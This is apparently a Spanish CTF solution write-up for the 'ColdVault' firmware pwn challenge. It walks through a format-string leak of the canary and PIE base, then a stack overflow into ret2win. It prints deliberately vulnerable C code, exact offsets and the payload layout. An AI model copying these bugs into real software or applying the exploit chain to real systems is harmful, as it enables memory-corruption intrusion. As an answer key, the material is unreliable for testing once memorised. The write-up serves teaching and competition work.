# Solución — pwn-binary-05 · ColdVault Firmware

**Categoría:** pwn (binario clásico en C) · **Dificultad:** insane · **Puntos:** 750
**Vuln central:** corrupción de memoria → cadena *format-string leak* → *stack overflow* → *ret2win*.

---

## Historia

"ColdVault" es el firmware de una **bóveda de almacenamiento en frío** (cold
storage) para IoT: un dispositivo custodio que guarda las claves/seed maestras
de una red de nodos fuera de línea. El fabricante dejó abierta una **consola de
mantenimiento por puerto serie** para diagnóstico de campo; aquí esa consola
está puenteada a TCP (`nc <host> 9999`).

El patrón es **brutalmente real**. Fallos de firmware embebido han costado
millones y han tumbado infraestructura:

- **CWE-134 (format string)** en firmware de routers, cámaras IP y equipos
  SCADA: un `printf(user_input)` que filtra memoria y permite escritura
  arbitraria. Clase de bug recurrente en dispositivos de red durante 20 años.
- **CWE-121 (stack overflow)** en firmware IoT: la base de botnets como **Mirai**
  y sucesores, que combinaron credenciales débiles con desbordamientos en
  parsers de firmware para comprometer cientos de miles de dispositivos.
- En el mundo cripto/cold-storage, desbordamientos en el parser de comandos de
  **wallets hardware** han permitido extracción de secretos del dispositivo;
  varias divulgaciones responsables evitaron pérdidas de fondos de ocho cifras.

ColdVault reproduce esa clase de bug de forma **determinista y white-box**: te
entregamos el `vuln.c` para que calcules los offsets y construyas la cadena.

---

## Reconocimiento

La consola (`help`) ofrece:

```
status         - estado de la bóveda
diag <text>    - autodiagnóstico (hace eco del texto)   <-- format string
label <text>   - fija etiqueta de inventario            <-- stack overflow
exit           - cierra sesión
```

El objetivo es la función ganadora `unlock_vault()`, **inalcanzable por flujo
normal**: imprime la flag (leída de env `FLAG`) y sólo se llega secuestrando la
dirección de retorno.

### Protecciones del binario

```
Arch:     amd64-64-little
RELRO:    Full RELRO        (-Wl,-z,relro,-z,now)
Stack:    Canary found      (-fstack-protector-all)
NX:       NX enabled        (GNU_STACK no ejecutable)
PIE:      PIE enabled       (-fPIE -pie ; ELF Type DYN)
```

Las cuatro mitigaciones están activas. Hay que bypassear canario + PIE, y como
NX impide shellcode en stack, se hace **ret2win**.

---

## Las dos vulnerabilidades

### 1) Format string — `diag <texto>` (CWE-134)

```c
static void run_diag(const char *user_text) {
    printf("[diag] self-test report for input: ");
    printf(user_text);          /* <-- el texto es la CADENA DE FORMATO */
    ...
}
```

Con `%N$p` se lee la posición N del stack. Enumerando posiciones:

```
diag %9$p     -> CANARIO de stack   (entero de 64 bits cuyo byte bajo es 0x00)
diag %11$p    -> retorno a main()    (puntero de código -> base PIE)
```

### 2) Stack buffer overflow — `label <texto>` (CWE-121)

```c
static void set_label(const char *src, size_t len) {
    char name[64];
    memcpy(name, src, len);     /* len = bytes LEÍDOS, NO sizeof(name) */
    ...
}
```

La copia es **por longitud recibida** (no por `strlen`), así que el payload
puede contener bytes NUL — imprescindible para reescribir el canario (acaba en
`0x00`) y las direcciones PIE. `name[64]` se desborda y se alcanza el canario,
el saved RBP y la dirección de retorno.

---

## Offsets (deterministas)

El binario es **idéntico para todos los equipos** (mismas flags de
compilación), por lo que los offsets son fijos. Verificados sobre el build
reproducible (`gcc:13`, flags del `Dockerfile`):

| Elemento                         | Valor                         | Cómo se obtiene |
|----------------------------------|-------------------------------|-----------------|
| Canario (format string)          | `%9$p`                        | byte bajo `0x00` |
| Puntero de código (format string)| `%11$p`                       | forma `0x55…`/`0x56…` |
| Offset del leak `%11$p`          | `0x1720`                      | `objdump`/gdb (retorno a `main`) |
| Base PIE                         | `leak(%11$p) - 0x1720`        | resta del offset |
| `unlock_vault()`                 | `base + 0x12bb`               | `objdump -d coldvault \| grep unlock_vault` |
| Gadget `ret` (alineación)        | `base + 0x1016`               | `objdump -d coldvault \| grep -m1 'ret$'` |
| Padding buffer → canario         | `72` bytes                    | `name[]` en `-0x50(rbp)`, canario en `-0x8(rbp)` ⇒ `0x50-0x8=0x48=72` |

> Recalcular tú mismo:
> ```sh
> objdump -d coldvault | grep '<unlock_vault>:'      # offset de unlock_vault
> objdump -d coldvault | grep -m1 -E '\sret$'         # gadget ret
> # base = (leak de %11$p) - 0x1720
> ```

---

## Cadena de explotación

```
1. diag %9$p     -> filtra el CANARIO
2. diag %11$p    -> filtra un retorno -> base PIE = leak - 0x1720
3. label <payload de overflow>:
       72*'A'  +  p64(canario)  +  p64(rbp_falso)  +  p64(ret_gadget)  +  p64(unlock_vault)
4. exit          -> el frame retorna -> RIP = unlock_vault() -> imprime la FLAG
```

### Por qué el gadget `ret`

`unlock_vault()` llama a `puts`/`printf`, que usan instrucciones SSE
(`movaps`) y **exigen RSP alineado a 16 bytes** en el momento del `call`. Tras
nuestro `ret`, la pila queda desalineada en 8: salta el primer `puts`
("UNLOCKED") pero **crashea** (SIGSEGV) antes del `printf` de la flag.
Intercalar un único gadget `ret` (consume 8 bytes y corrige la paridad)
realinea la pila y la flag se imprime limpiamente.

### Mitigaciones bypasseadas

| Mitigación | Bypass |
|------------|--------|
| **Stack canary** | filtrado con la format string (`%9$p`) y recolocado intacto en el payload → `__stack_chk_fail` no se dispara. |
| **PIE / ASLR**   | filtrado de un retorno de código (`%11$p`) → base PIE; `unlock_vault` = base + offset. |
| **NX**           | no se ejecuta shellcode: **ret2win** (return-to-function) a una función ya presente. |
| **Full RELRO**   | irrelevante para esta cadena (no se sobrescribe GOT). |
| **Alineación SSE** | gadget `ret` intercalado. |

---

## Ejecución

```sh
pip install pwntools
python3 solution/exploit.py <host> 9999
# [+] base PIE       : 0x...000
# [+] unlock_vault() : 0x...2bb
# [!!!] COLD VAULT UNLOCKED — emergency master key released
# [FLAG] flag{...}
```

> Validado end-to-end: format-string leak (canario + base PIE) → overflow →
> ret2win → `[FLAG] ...` impreso por el servicio TCP a través del puente.

---

## Por qué es INSANE

- Requiere **encadenar dos primitivas** distintas (info-leak + control de flujo),
  no un solo bug trivial.
- Hay que **bypassear cuatro mitigaciones** modernas (canary, PIE, NX, +
  alineación SSE), entendiendo el layout de stack y el rebasing PIE.
- El cálculo de offsets desde el source (white-box) y el detalle de la
  alineación (`movaps`) son justo los escollos que separan un intento que
  "casi funciona" de uno que recupera la flag.

---

## Nota anti-cheat

- El **binario es idéntico para todos los equipos** (mismas flags de compilación
  → mismos offsets). Compartir el binario **NO filtra la flag**: la flag es
  **por-equipo**, inyectada por env `FLAG` en runtime (flag-service, no está en
  la imagen ni en el código). `unlock_vault()` lee `getenv("FLAG")` de **su**
  contenedor; cada equipo debe ejecutar la cadena contra **su** servicio para
  obtener **su** flag.
- Enviar la flag de otro equipo dispara la verificación de propiedad
  (`cheat_flag_share`).
- El puente TCP **loguea cada payload** (`CTFREQ`): los comandos `diag` se ven
  como texto y el payload binario del overflow se registra como `hex:...`. Un
  payload anormalmente grande (≥200 bytes acumulados) emite además un evento
  SIEM `scan_detected`/`alert` al collector (`reason: memory-corruption-payload`).
- El servicio se sirve por red en la subred del equipo (`172.30.N.44:9999`), sin
  puerto publicado al host: sólo accesible desde la VPN del equipo.
